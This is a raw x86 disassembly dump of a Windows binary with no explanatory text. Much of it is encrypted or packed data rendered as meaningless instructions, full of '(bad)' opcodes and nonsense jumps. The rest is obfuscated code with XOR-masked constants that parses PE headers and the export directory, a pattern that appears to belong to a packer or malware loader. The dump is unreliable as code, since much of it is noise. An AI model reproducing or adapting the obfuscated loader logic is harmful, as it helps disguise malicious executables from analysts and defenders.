  4235e0:	inc    edi
  4235e1:	ins    BYTE PTR es:[edi],dx
  4235e2:	(bad)  
  4235e3:	icebp  
  4235e4:	xor    BYTE PTR [esi],bl
  4235e6:	add    al,0x9a
  4235e8:	jp     0x423614
  4235ea:	pop    eax
  4235eb:	std    
  4235ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235ed:	adc    ah,BYTE PTR [eax-0x35]
  4235f0:	sahf   
  4235f1:	and    BYTE PTR [ecx-0x5f94e110],bh
  4235f7:	mov    ss,WORD PTR [ebx-0x17]
  4235fa:	aas    
  4235fb:	aad    0x7
  4235fd:	jbe    0x4235c2
  4235ff:	pusha  
  423600:	in     eax,dx
  423601:	sbb    eax,0xe696bb6e
  423606:	push   edx
  423607:	jecxz  0x42365e
  423609:	push   ss
  42360a:	jbe    0x423652
  42360c:	mov    edx,0x6b173054
  423611:	cmp    BYTE PTR [eax-0x28190464],0x2d
  423618:	push   ebp
  423619:	and    esi,DWORD PTR gs:[eax+0x66]
  42361d:	out    dx,eax
  42361e:	daa    
  42361f:	leave  
  423620:	jp     0x423678
  423622:	push   esp
  423623:	clc    
  423624:	add    DWORD PTR [eax+0x15],eax
  423627:	dec    esp
  423628:	mov    dh,0x4e
  42362a:	push   0x20
  42362c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42362d:	add    al,0x9e
  42362f:	fidivr WORD PTR [edx+0x6e88983c]
  423635:	sub    BYTE PTR [eax+0x33],cl
  423638:	mov    ecx,0x8ec9d282
  42363d:	ja     0x4235ff
  42363f:	sahf   
  423640:	jno    0x42368e
  423642:	shl    BYTE PTR [edx+0x7c256ac5],0x5b
  423649:	push   ds
  42364a:	mov    al,0x6d
  42364c:	shl    DWORD PTR [esi-0x539350b5],1
  423652:	outs   dx,DWORD PTR ds:[esi]
  423653:	inc    edx
  423654:	push   ecx
  423655:	int3   
  423656:	xchg   ecx,esi
  423658:	inc    ebp
  423659:	add    al,0xc3
  42365b:	in     al,dx
  42365c:	sub    dl,0xde
  42365f:	pop    edi
  423660:	out    dx,al
  423661:	ror    BYTE PTR ds:0xe0ccf57,0x37
  423668:	sbb    esi,esp
  42366a:	loope  0x4236a2
  42366c:	lahf   
  42366d:	(bad)  
  42366e:	push   esp
  42366f:	(bad)  
  423670:	add    bh,BYTE PTR [ebx-0x1614a357]
  423676:	cdq    
  423677:	ins    BYTE PTR es:[edi],dx
  423678:	rcr    DWORD PTR [edx-0x5e],0xbe
  42367c:	mov    ebx,0x3cdfe7fe
  423681:	mov    eax,0x39e93279
  423686:	call   0x45dc710d
  42368b:	lea    ebx,[edx+0x72ae88a7]
  423691:	loop   0x423661
  423693:	cmp    al,0x8e
  423695:	mov    DWORD PTR [edx],ecx
  423697:	div    BYTE PTR [ebx]
  423699:	push   es
  42369a:	pop    ds
  42369b:	into   
  42369c:	dec    ebx
  42369d:	dec    bp
  42369f:	and    ebp,ecx
  4236a1:	cwde   
  4236a2:	mov    cl,0xe5
  4236a4:	jnp    0x423710
  4236a6:	mov    esi,0x3afdf49a
  4236ab:	pop    ebx
  4236ac:	jae    0x4236d2
  4236ae:	rol    BYTE PTR [ecx+esi*8+0x7],1
  4236b2:	lods   eax,DWORD PTR ds:[esi]
  4236b3:	clc    
  4236b4:	pop    ss
  4236b5:	adc    dl,ch
  4236b7:	test   cl,dh
  4236b9:	xchg   esp,eax
  4236ba:	repnz inc edx
  4236bc:	push   eax
  4236bd:	shl    edi,0x80
  4236c0:	mov    ds:0x4280aa32,eax
  4236c5:	inc    esp
  4236c6:	inc    ebp
  4236c7:	inc    eax
  4236c8:	pusha  
  4236c9:	int    0x11
  4236cb:	or     eax,0xf00cbd58
  4236d0:	dec    ecx
  4236d1:	gs ins BYTE PTR es:[edi],dx
  4236d3:	cdq    
  4236d4:	stc    
  4236d5:	fcomi  st,st(6)
  4236d7:	inc    ebp
  4236d8:	pop    ecx
  4236d9:	dec    ebx
  4236da:	mov    ecx,0x23fa0846
  4236df:	adc    al,0xcf
  4236e1:	xlat   BYTE PTR ds:[ebx]
  4236e2:	sbb    al,BYTE PTR [edx]
  4236e4:	shr    BYTE PTR [ebx+ebx*2+0x73],1
  4236e8:	jns    0x4236c2
  4236ea:	push   ebx
  4236eb:	jmp    0xcb2bf839
  4236f0:	(bad)  
  4236f1:	fdivr  st,st(3)
  4236f3:	jae    0x42373c
  4236f5:	pop    es
  4236f6:	scas   eax,DWORD PTR es:[edi]
  4236f7:	sub    BYTE PTR [ecx],dl
  4236f9:	fsubr  DWORD PTR [edi-0x4c164e9a]
  4236ff:	mov    ds:0xdeb3e07f,al
  423704:	icebp  
  423705:	lods   al,BYTE PTR ds:[esi]
  423706:	mov    ds:0x4e53451f,al
  42370b:	mov    ebx,0xfce8affe
  423710:	xor    edi,DWORD PTR [edx]
  423712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423713:	popa   
  423714:	xor    al,0x90
  423716:	(bad)  
  423717:	sahf   
  423718:	mov    ah,0x1e
  42371a:	clc    
  42371b:	xchg   BYTE PTR [edx-0x5b],bl
  42371e:	cmp    al,0xc8
  423720:	jle    0x4236c4
  423722:	cmp    DWORD PTR [ebx+0x48],ecx
  423725:	aam    0xd2
  423727:	imul   eax,DWORD PTR [edi-0x1d],0x76
  42372b:	std    
  42372c:	jmp    0xcd1a:0x5b6bb29
  423733:	les    ecx,FWORD PTR [ebp+edi*4+0x38ccc229]
  42373a:	(bad)  
  42373b:	cli    
  42373c:	lds    edx,FWORD PTR [esi]
  42373e:	retf   
  42373f:	pop    ecx
  423740:	mov    al,0xfe
  423742:	jecxz  0x4237c2
  423744:	cmp    DWORD PTR [edx+edi*2-0x2d38b919],0xfffffffe
  42374c:	pop    edi
  42374d:	in     eax,0x39
  42374f:	aaa    
  423750:	xchg   DWORD PTR [ecx+ebp*1],ebp
  423753:	mov    eax,ds:0x3d938b20
  423758:	aad    0x62
  42375a:	call   0xec9dfd3a
  42375f:	sub    ah,0x17
  423762:	mov    ebp,0x35c9063a
  423767:	aam    0x14
  423769:	ja     0x4237c3
  42376b:	mov    dl,0xfd
  42376d:	clc    
  42376e:	les    eax,FWORD PTR [ecx+0x11]
  423771:	push   esp
  423772:	ficomp DWORD PTR [eax-0x4789470a]
  423778:	cmp    DWORD PTR [edx+0x3aa8d227],0x1c9dfb1f
  423782:	jecxz  0x42374b
  423784:	outs   dx,DWORD PTR ds:[esi]
  423785:	inc    edi
  423786:	and    DWORD PTR [edx*8-0x1dacc4a8],edx
  42378d:	or     ah,BYTE PTR [edi]
  42378f:	xor    DWORD PTR [eax+0x3f],esp
  423792:	(bad)  
  423793:	aad    0x38
  423795:	loope  0x423791
  423797:	popa   
  423798:	mov    WORD PTR [eax-0x40],fs
  42379b:	mov    ah,0xb5
  42379d:	xchg   esi,eax
  42379e:	push   ebp
  42379f:	xchg   ebp,eax
  4237a0:	xchg   esp,eax
  4237a1:	add    bl,BYTE PTR [esi+ecx*1]
  4237a4:	adc    al,0x55
  4237a6:	dec    edx
  4237a7:	repz sar BYTE PTR [ebx-0x6d],cl
  4237ab:	fwait
  4237ac:	jmp    0x37d8:0x8f535bb8
  4237b3:	pop    esi
  4237b4:	mov    ah,0xfc
  4237b6:	adc    eax,0xf8d1b799
  4237bb:	add    dh,BYTE PTR [edx]
  4237bd:	xchg   ebx,eax
  4237be:	inc    esi
  4237bf:	inc    edx
  4237c0:	cld    
  4237c1:	test   bl,al
  4237c3:	inc    ecx
  4237c4:	push   edi
  4237c5:	icebp  
  4237c6:	jns    0x423802
  4237c8:	mov    ch,BYTE PTR [bx]
  4237cb:	or     esp,edi
  4237cd:	shr    DWORD PTR [ecx-0x1f],1
  4237d0:	xor    BYTE PTR [ecx+0x43],cl
  4237d3:	xchg   esp,eax
  4237d4:	sub    eax,0x9a91e49e
  4237d9:	int    0xca
  4237db:	pop    ebp
  4237dc:	les    eax,FWORD PTR [eax]
  4237de:	dec    edi
  4237df:	bswap  ebx
  4237e1:	fidivr DWORD PTR [edx]
  4237e3:	rcl    dh,0xc2
  4237e6:	and    eax,0xb1abe74a
  4237eb:	jmp    0xe034:0xce392098
  4237f2:	xchg   ebp,eax
  4237f3:	out    dx,eax
  4237f4:	jb     0x42386c
  4237f6:	xchg   ebp,eax
  4237f7:	hlt    
  4237f8:	(bad)  
  4237f9:	(bad)  
  4237fa:	daa    
  4237fb:	stc    
  4237fc:	sub    ebx,DWORD PTR [ebp-0x33d620ff]
  423802:	dec    ebx
  423803:	xor    DWORD PTR [ebp-0x1b272894],edi
  423809:	jle    0x42381c
  42380b:	xor    DWORD PTR [ebx+0x51],ebp
  42380e:	fiadd  WORD PTR [edi-0x4a]
  423811:	pop    ss
  423812:	je     0x4237dc
  423814:	(bad)  
  423815:	jge    0x423839
  423817:	mov    esi,0xb9ebf26c
  42381c:	nop
  42381d:	jecxz  0x423862
  42381f:	iret   
  423820:	sub    BYTE PTR [edx],al
  423822:	mov    esp,0x36299dc1
  423827:	mov    eax,0xc8678e15
  42382c:	lds    ebp,FWORD PTR [eax+0x38ed27c4]
  423832:	and    ecx,ebp
  423834:	jmp    0xda66:0xb5b2c821
  42383b:	jecxz  0x4237c1
  42383d:	fild   QWORD PTR [ebp+edi*2-0x3b696172]
  423844:	ret    0x8810
  423847:	push   ecx
  423848:	dec    edi
  423849:	int3   
  42384a:	adc    eax,DWORD PTR [eax]
  42384c:	fsubp  st(0),st
  42384e:	adc    al,0x4c
  423850:	sub    eax,DWORD PTR [esi-0x2b41b312]
  423856:	aam    0x39
  423858:	inc    eax
  423859:	cdq    
  42385a:	dec    ebx
  42385b:	xchg   ecx,eax
  42385c:	xchg   edx,eax
  42385d:	(bad)  
  42385e:	stos   DWORD PTR es:[edi],eax
  42385f:	jae    0x4238c4
  423861:	punpckhdq mm2,QWORD PTR [edx+eax*4+0x2b]
  423866:	ffreep st(3)
  423868:	jne    0x423898
  42386a:	xchg   edi,eax
  42386b:	add    al,0xa1
  42386d:	fwait
  42386e:	test   DWORD PTR ds:[esi+edx*4-0x7f67dbdd],eax
  423876:	jge    0x4238dd
  423878:	xchg   edi,eax
  423879:	xchg   edx,eax
  42387a:	mov    cl,0x76
  42387c:	and    eax,0x314c7c0d
  423881:	mov    ebx,0x5932ab7b
  423886:	xor    dl,bh
  423888:	mov    edx,0x83c267be
  42388d:	imul   dl
  42388f:	jl     0x423860
  423891:	jg     0x42388e
  423893:	int3   
  423894:	imul   edi,DWORD PTR [ecx-0x75],0x40
  423898:	bound  ebx,QWORD PTR [ecx-0x6fd18da0]
  42389e:	and    DWORD PTR [esp+edi*2+0x63],ecx
  4238a2:	push   0x33
  4238a4:	sub    ecx,DWORD PTR [esi+0x67011935]
  4238aa:	fwait
  4238ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ac:	std    
  4238ad:	xchg   BYTE PTR [eax],dl
  4238af:	cmp    cl,BYTE PTR [ebp-0x78ee24fb]
  4238b5:	mov    al,ds:0xaf0dba91
  4238ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238bb:	xchg   esi,eax
  4238bc:	push   ecx
  4238bd:	ins    DWORD PTR es:[edi],dx
  4238be:	dec    ebp
  4238bf:	loopne 0x4238f1
  4238c1:	cwde   
  4238c2:	test   al,0x72
  4238c4:	jg     0x4238c3
  4238c6:	in     al,dx
  4238c7:	addr16 das 
  4238c9:	xchg   ebp,eax
  4238ca:	mov    bh,0xc4
  4238cc:	or     eax,0xc1017d77
  4238d1:	call   0x62d7:0x139b98c
  4238d8:	ins    DWORD PTR es:[edi],dx
  4238d9:	popf   
  4238da:	adc    al,0xce
  4238dc:	neg    BYTE PTR [ecx+0x10267ffe]
  4238e2:	popa   
  4238e3:	enter  0x9ce9,0xfb
  4238e7:	push   eax
  4238e8:	sub    ebx,DWORD PTR [esi+0x31]
  4238eb:	imul   ebp,DWORD PTR [eax],0x3b84005e
  4238f1:	mov    al,0xf8
  4238f3:	cli    
  4238f4:	mov    bl,0x66
  4238f6:	dec    ecx
  4238f7:	jge    0x4238be
  4238f9:	call   FWORD PTR [ebx]
  4238fb:	mov    eax,gs
  4238fd:	mov    ah,0x48
  4238ff:	pop    es
  423900:	fnsave [esi]
  423902:	in     al,dx
  423903:	lock push esi
  423905:	xor    ch,BYTE PTR [eax+0x1f6f3f2b]
  42390b:	or     bh,BYTE PTR [esi+eiz*2]
  42390e:	repz xor al,0x3c
  423911:	mov    ecx,0x78bbfee9
  423916:	stos   BYTE PTR es:[edi],al
  423917:	icebp  
  423918:	fcomi  st,st(1)
  42391a:	mov    dh,0x17
  42391c:	mov    ecx,0x60de3175
  423921:	stc    
  423922:	and    ebx,DWORD PTR [esp+esi*8-0x7]
  423926:	cmp    BYTE PTR [edi+0x6b5d7a4e],0x56
  42392d:	(bad)  
  42392e:	addr16 mov ch,0x98
  423931:	mov    DWORD PTR [edx-0x1e],esp
  423934:	mov    bl,0x5f
  423936:	xchg   ebx,eax
  423937:	sbb    ebx,DWORD PTR [edx]
  423939:	xchg   BYTE PTR [ebx],bl
  42393b:	ret    0x29a2
  42393e:	mov    al,ds:0xe95be8dc
  423943:	sbb    BYTE PTR [esi+0x34ccc957],cl
  423949:	in     eax,0xc6
  42394b:	aaa    
  42394c:	int3   
  42394d:	cld    
  42394e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42394f:	sub    al,0xcc
  423951:	pop    ds
  423952:	(bad)  
  423953:	aam    0xd0
  423955:	test   BYTE PTR ds:0xba98ab68,0xc9
  42395c:	xabort 0xa4
  42395f:	xor    ebp,DWORD PTR [ebx-0x11cdd21c]
  423965:	lods   eax,DWORD PTR ds:[esi]
  423966:	cmp    eax,0xba962136
  42396b:	loope  0x42393a
  42396d:	xchg   esp,eax
  42396e:	outs   dx,DWORD PTR ds:[esi]
  42396f:	xor    eax,0x7f87344
  423974:	sbb    al,0xe6
  423976:	dec    ecx
  423977:	ds loope 0x4239a0
  42397a:	and    bl,dh
  42397c:	sub    BYTE PTR [edi],cl
  42397e:	push   ebp
  42397f:	and    ebx,DWORD PTR [ebp-0x6eb5710b]
  423985:	les    ebx,FWORD PTR [edx+eiz*2+0x61]
  423989:	push   0xffffffee
  42398b:	das    
  42398c:	lods   eax,DWORD PTR ds:[esi]
  42398d:	das    
  42398e:	loop   0x423922
  423990:	call   0xd8fecaa9
  423995:	jp     0x423923
  423997:	sbb    BYTE PTR [esi],ah
  423999:	imul   esi,DWORD PTR [edi+0xa],0x7e185ba8
  4239a0:	push   0xffffffc5
  4239a2:	scas   al,BYTE PTR es:[edi]
  4239a3:	mov    eax,ds:0x8cc5cfaf
  4239a8:	jnp    0x42397f
  4239aa:	hlt    
  4239ab:	jne    0x4239f9
  4239ad:	xchg   dh,dl
  4239af:	lahf   
  4239b0:	xchg   ebp,eax
  4239b1:	xor    DWORD PTR ds:0x205b0aef,ebx
  4239b7:	sub    cl,BYTE PTR [ebp-0xf13f9d]
  4239bd:	pop    esi
  4239be:	lods   eax,DWORD PTR ds:[esi]
  4239bf:	clc    
  4239c0:	test   al,0x8c
  4239c2:	mov    edx,0x59a46551
  4239c7:	bound  esi,QWORD PTR [edx-0xbae7f9]
  4239cd:	arpl   WORD PTR [edi+0x5fe3a867],sp
  4239d3:	cmp    dh,BYTE PTR [esp+eiz*8]
  4239d6:	mov    bl,0xc
  4239d8:	(bad)  
  4239da:	sub    al,0x8e
  4239dc:	stos   BYTE PTR es:[edi],al
  4239dd:	mov    al,BYTE PTR [edi-0x23]
  4239e0:	aas    
  4239e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239e2:	add    al,0x27
  4239e4:	stos   BYTE PTR es:[edi],al
  4239e5:	xor    eax,0xd5915be7
  4239ea:	in     eax,dx
  4239eb:	loop   0x423972
  4239ed:	mov    esp,0x76f77a37
  4239f2:	imul   edi,DWORD PTR [ebx+0x1984085],0xb623b244
  4239fc:	sub    eax,0x719a4904
  423a01:	mov    esp,ebp
  423a03:	adc    al,0xf3
  423a05:	js     0x423a7c
  423a07:	jmp    0xb5db:0x2031a73c
  423a0e:	push   ebx
  423a0f:	push   0x6813eeca
  423a14:	push   ecx
  423a15:	sbb    esp,0x615858
  423a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a1c:	push   eax
  423a1d:	xchg   BYTE PTR [edx+0x6ffe9116],dh
  423a23:	dec    edi
  423a24:	(bad)  
  423a25:	or     BYTE PTR ds:0x9c05e29c,bh
  423a2b:	sahf   
  423a2c:	outs   dx,DWORD PTR ds:[esi]
  423a2d:	push   ss
  423a2e:	mov    ch,0xf2
  423a30:	mov    eax,ds:0xcf5d4c77
  423a35:	out    dx,eax
  423a36:	jae    0x423a64
  423a38:	call   0xb6e93f4e
  423a3d:	adc    DWORD PTR ds:0x4159f54a,esp
  423a43:	loopne 0x4239f0
  423a45:	jge    0x423a21
  423a47:	fldlg2 
  423a49:	adc    al,0x6f
  423a4b:	test   BYTE PTR [edi+0x76],al
  423a4e:	pop    esp
  423a4f:	or     eax,0xc5cf7d2b
  423a54:	push   0xc4ccf812
  423a59:	fimul  DWORD PTR ds:0xdcc12337
  423a5f:	xchg   esi,eax
  423a60:	mov    ?,WORD PTR [ecx+0x58c9cd6d]
  423a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a67:	clc    
  423a68:	pop    ecx
  423a69:	inc    esp
  423a6a:	cmp    al,0x4d
  423a6c:	shl    edi,cl
  423a6e:	lods   al,BYTE PTR ds:[esi]
  423a6f:	iret   
  423a70:	sub    DWORD PTR [edx],0x594a0d02
  423a76:	(bad)  
  423a77:	lahf   
  423a78:	mov    WORD PTR [esi-0x52],?
  423a7b:	and    ebx,ebx
  423a7d:	pop    ebx
  423a7e:	push   edx
  423a7f:	imul   BYTE PTR [ebp+0x31]
  423a82:	ds pop ebx
  423a84:	push   edx
  423a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a86:	test   BYTE PTR [ebx-0x2d],ah
  423a89:	dec    esi
  423a8a:	jbe    0x423a60
  423a8c:	xor    cl,BYTE PTR ds:[esi]
  423a8f:	fstp   DWORD PTR cs:[ecx-0xef9fa9]
  423a96:	mov    cl,0x4b
  423a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a99:	ret    
  423a9a:	mov    cl,0x94
  423a9c:	sbb    eax,0x26083f51
  423aa1:	cld    
  423aa2:	pop    esp
  423aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423aa4:	ins    DWORD PTR es:[edi],dx
  423aa5:	adc    al,0xe
  423aa7:	add    ecx,esp
  423aa9:	fistp  QWORD PTR [esi+ebx*2-0x7db80cc0]
  423ab0:	rol    BYTE PTR [edi],0xd0
  423ab3:	pusha  
  423ab4:	shl    BYTE PTR [ebp+0x71f9cda],cl
  423aba:	ja     0x423a56
  423abc:	ja     0x423b00
  423abe:	mov    edx,DWORD PTR [ebp-0x8]
  423ac1:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423ac9:	mov    edx,DWORD PTR [ebp-0x54]
  423acc:	xor    edx,esi
  423ace:	lea    eax,[edx+eax*1+0x3272db]
  423ad5:	movzx  edx,BYTE PTR [ebp-0x1]
  423ad9:	xor    edx,eax
  423adb:	mov    BYTE PTR [ebp-0x1],dl
  423ade:	mov    al,BYTE PTR [ebp-0x1]
  423ae1:	mov    edx,DWORD PTR [ebp-0x1c]
  423ae4:	mov    ebx,DWORD PTR [ebp-0xc]
  423ae7:	xor    edx,esi
  423ae9:	add    edx,edi
  423aeb:	imul   edx,ebx
  423aee:	mov    ebx,DWORD PTR [ebp-0x8]
  423af1:	mov    BYTE PTR [edx+ebx*1],al
  423af4:	mov    eax,DWORD PTR [ebp-0x30]
  423af7:	mov    edx,DWORD PTR [ebp-0x3c]
  423afa:	xor    eax,esi
  423afc:	xor    edx,esi
  423afe:	add    eax,edi
  423b00:	add    edx,edi
  423b02:	imul   eax,edx
  423b05:	add    eax,DWORD PTR [ebp-0xc]
  423b08:	mov    DWORD PTR [ebp-0xc],eax
  423b0b:	mov    eax,DWORD PTR [ebp-0xc]
  423b0e:	mov    edx,DWORD PTR [ebp-0x24]
  423b11:	cmp    edx,eax
  423b13:	jb     0x41e9a5
  423b19:	mov    eax,DWORD PTR [ebp-0x3c]
  423b1c:	mov    edx,DWORD PTR [ebp-0x24]
  423b1f:	xor    eax,esi
  423b21:	add    eax,edi
  423b23:	imul   eax,edx
  423b26:	mov    edx,DWORD PTR [ebp-0x20]
  423b29:	xor    edx,esi
  423b2b:	add    edx,edi
  423b2d:	or     eax,edx
  423b2f:	mov    edx,DWORD PTR [ebp-0x18]
  423b32:	xor    edx,esi
  423b34:	add    eax,edx
  423b36:	mov    edx,DWORD PTR [ebp-0x18]
  423b39:	xor    edx,esi
  423b3b:	add    eax,edx
  423b3d:	mov    edx,DWORD PTR [ebp-0x10]
  423b40:	lea    eax,[eax+edx*1+0x64e5b6]
  423b47:	jmp    0x423b5b
  423b4c:	mov    eax,DWORD PTR [ebp-0x18]
  423b4f:	mov    edx,DWORD PTR [ebp-0x10]
  423b52:	xor    eax,esi
  423b54:	lea    eax,[eax+edx*1+0x3272db]
  423b5b:	mov    DWORD PTR [ebp-0x10],eax
  423b5e:	jmp    0x41e8f2
  423b63:	mov    eax,DWORD PTR [ebp-0x38]
  423b66:	mov    edx,DWORD PTR [ebp+0xc]
  423b69:	xor    edx,esi
  423b6b:	lea    ecx,[ecx+edx*1+0x3272db]
  423b72:	lea    edx,[ecx-0x3272db]
  423b78:	xor    edx,esi
  423b7a:	cmp    edx,0xf89c95b6
  423b80:	jne    0x41e770
  423b86:	mov    ecx,DWORD PTR [ebp+0x8]
  423b89:	mov    edx,DWORD PTR [ebp+0xc]
  423b8c:	mov    ebx,DWORD PTR [ebp+0x8]
  423b8f:	xor    edx,esi
  423b91:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423b98:	xor    ecx,esi
  423b9a:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423ba1:	xor    ebx,esi
  423ba3:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423baa:	mov    edx,DWORD PTR [ebp+0xc]
  423bad:	xor    edx,esi
  423baf:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423bb6:	mov    eax,DWORD PTR [ebp+0xc]
  423bb9:	xor    eax,esi
  423bbb:	add    eax,edi
  423bbd:	pop    edi
  423bbe:	pop    esi
  423bbf:	pop    ebx
  423bc0:	leave  
  423bc1:	ret    0x8
  423bc4:	push   ebp
  423bc5:	mov    ebp,esp
  423bc7:	push   ecx
  423bc8:	mov    eax,ds:0x42c008
  423bcd:	xor    DWORD PTR ds:0x42c000,eax
  423bd3:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423bda:	mov    eax,DWORD PTR [ebp+0x8]
  423bdd:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423be7:	mov    al,BYTE PTR [eax]
  423be9:	add    DWORD PTR ds:0x429020,0x42b018
  423bf3:	add    al,0xd
  423bf5:	xor    DWORD PTR ds:0x42901c,0x429000
  423bff:	xor    al,0x6f
  423c01:	mov    DWORD PTR ds:0x42d008,0x56e
  423c0b:	cmp    al,0x35
  423c0d:	mov    DWORD PTR ds:0x42c000,0x518
  423c17:	jne    0x423c92
  423c1d:	mov    eax,DWORD PTR [ebp+0x8]
  423c20:	mov    edx,DWORD PTR ds:0x429014
  423c26:	or     DWORD PTR ds:0x429010,edx
  423c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  423c2f:	add    ecx,DWORD PTR [eax+0x3c]
  423c32:	mov    edx,0x7510893
  423c37:	adc    eax,DWORD PTR ds:0x42c01c
  423c3d:	mov    DWORD PTR [ebp+0x8],ecx
  423c40:	mov    eax,DWORD PTR [ebp-0x4]
  423c43:	xor    eax,edx
  423c45:	adc    ecx,0x2aad
  423c4b:	push   esi
  423c4c:	add    DWORD PTR ds:0x42d01c,0x22ba
  423c56:	mov    esi,DWORD PTR [ebp+0x8]
  423c59:	xor    ecx,ecx
  423c5b:	xor    ecx,DWORD PTR ds:0x42901c
  423c61:	xor    ecx,DWORD PTR ds:0x42a010
  423c67:	mov    DWORD PTR ds:0x42901c,ecx
  423c6d:	mov    ecx,0x3272db
  423c72:	add    eax,ecx
  423c74:	cmp    DWORD PTR [esi+0x54],eax
  423c77:	pop    esi
  423c78:	je     0x423c86
  423c7e:	mov    eax,DWORD PTR [ebp+0x8]
  423c81:	jmp    0x423c9f
  423c86:	mov    eax,DWORD PTR [ebp-0x4]
  423c89:	xor    eax,edx
  423c8b:	add    eax,ecx
  423c8d:	jmp    0x423c9f
  423c92:	mov    eax,DWORD PTR [ebp-0x4]
  423c95:	xor    eax,0x7510893
  423c9a:	add    eax,0x3272db
  423c9f:	leave  
  423ca0:	ret    0x4
  423ca3:	push   ebp
  423ca4:	mov    ebp,esp
  423ca6:	push   ecx
  423ca7:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423cb1:	push   ecx
  423cb2:	and    DWORD PTR ds:0x42d014,0x0
  423cbc:	jmp    0x423cd0
  423cc1:	xor    edx,edx
  423cc3:	add    edx,DWORD PTR ds:0x42d014
  423cc9:	inc    edx
  423cca:	mov    DWORD PTR ds:0x42d014,edx
  423cd0:	cmp    DWORD PTR ds:0x42d014,0x1d
  423cd7:	jae    0x423d0e
  423cdd:	cmp    DWORD PTR ds:0x42d014,0x26
  423ce4:	jne    0x423d09
  423cea:	push   0x643f
  423cef:	push   DWORD PTR [ebp-0x24]
  423cf2:	push   0x42a010
  423cf7:	push   DWORD PTR [ebp-0xc]
  423cfa:	push   DWORD PTR [ebp-0x10]
  423cfd:	push   DWORD PTR [ebp-0x10]
  423d00:	push   DWORD PTR [ebp-0x28]
  423d03:	call   DWORD PTR ds:0x42502c
  423d09:	jmp    0x423cc1
  423d0e:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423d15:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423d1c:	dec    eax
  423d1d:	mov    eax,DWORD PTR [ebp-0x4]
  423d20:	add    edx,0x6ccb
  423d26:	push   esi
  423d27:	mov    esi,DWORD PTR [ebp-0x8]
  423d2a:	adc    DWORD PTR ds:0x42a00c,ebx
  423d30:	mov    edx,0x7510893
  423d35:	sbb    DWORD PTR ds:0x42c018,0x5978
  423d3f:	xor    eax,edx
  423d41:	sbb    DWORD PTR ds:0x42901c,0x3646
  423d4b:	xor    esi,edx
  423d4d:	sub    DWORD PTR ds:0x429014,0x4430
  423d57:	mov    ecx,0x3272db
  423d5c:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423d66:	add    esi,ecx
  423d68:	mov    DWORD PTR ds:0x42a010,0x31b3
  423d72:	add    eax,ecx
  423d74:	inc    DWORD PTR ds:0x42c01c
  423d7a:	imul   eax,esi
  423d7d:	mov    esi,DWORD PTR [ebp+0xc]
  423d80:	mov    DWORD PTR ds:0x429028,0xd41
  423d8a:	cmp    esi,eax
  423d8c:	jne    0x423daa
  423d92:	and    esi,eax
  423d94:	mov    eax,DWORD PTR [ebp-0x4]
  423d97:	mov    esi,DWORD PTR [ebp-0x8]
  423d9a:	xor    eax,edx
  423d9c:	xor    esi,edx
  423d9e:	add    eax,ecx
  423da0:	add    esi,ecx
  423da2:	imul   eax,esi
  423da5:	jmp    0x423de5
  423daa:	mov    eax,DWORD PTR [ebp+0xc]
  423dad:	mov    eax,DWORD PTR [eax+0x78]
  423db0:	mov    DWORD PTR [ebp+0xc],eax
  423db3:	mov    eax,DWORD PTR [ebp-0x4]
  423db6:	mov    esi,DWORD PTR [ebp-0x8]
  423db9:	xor    eax,edx
  423dbb:	xor    esi,edx
  423dbd:	add    eax,ecx
  423dbf:	add    esi,ecx
  423dc1:	imul   eax,esi
  423dc4:	mov    esi,DWORD PTR [ebp+0xc]
  423dc7:	cmp    esi,eax
  423dc9:	mov    eax,DWORD PTR [ebp-0x4]
  423dcc:	je     0x423d97
  423dd2:	xor    eax,edx
  423dd4:	add    eax,ecx
  423dd6:	mov    ecx,DWORD PTR [ebp+0xc]
  423dd9:	imul   eax,ecx
  423ddc:	add    eax,DWORD PTR [ebp+0x8]
  423ddf:	mov    DWORD PTR [ebp+0xc],eax
  423de2:	mov    eax,DWORD PTR [ebp+0xc]
  423de5:	pop    esi
  423de6:	leave  
  423de7:	ret    0x8
  423dea:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423df0:	inc    edx
  423df1:	add    BYTE PTR [eax],cl
  423df3:	mov    al,ds:0xa00c0042
  423df8:	inc    edx
  423df9:	add    BYTE PTR [eax],dl
  423dfb:	mov    al,ds:0xa0140042
  423e00:	inc    edx
  423e01:	add    BYTE PTR [eax],bl
  423e03:	mov    al,ds:0xa01c0042
  423e08:	inc    edx
  423e09:	add    BYTE PTR [eax],al
  423e0b:	mov    al,0x42
  423e0d:	add    BYTE PTR [eax+esi*4],al
  423e10:	inc    edx
  423e11:	add    BYTE PTR [eax],cl
  423e13:	mov    al,0x42
  423e15:	add    BYTE PTR [eax+esi*4],cl
  423e18:	inc    edx
  423e19:	add    BYTE PTR [eax],dl
  423e1b:	mov    al,0x42
  423e1d:	add    BYTE PTR [eax+esi*4],dl
  423e20:	inc    edx
  423e21:	add    BYTE PTR [eax],bl
  423e23:	mov    al,0x42
  423e25:	add    BYTE PTR [eax+esi*4],bl
  423e28:	inc    edx
  423e29:	add    BYTE PTR [eax],al
  423e2b:	rol    BYTE PTR [edx+0x0],0x4
  423e2f:	rol    BYTE PTR [edx+0x0],0x8
  423e33:	rol    BYTE PTR [edx+0x0],0xc
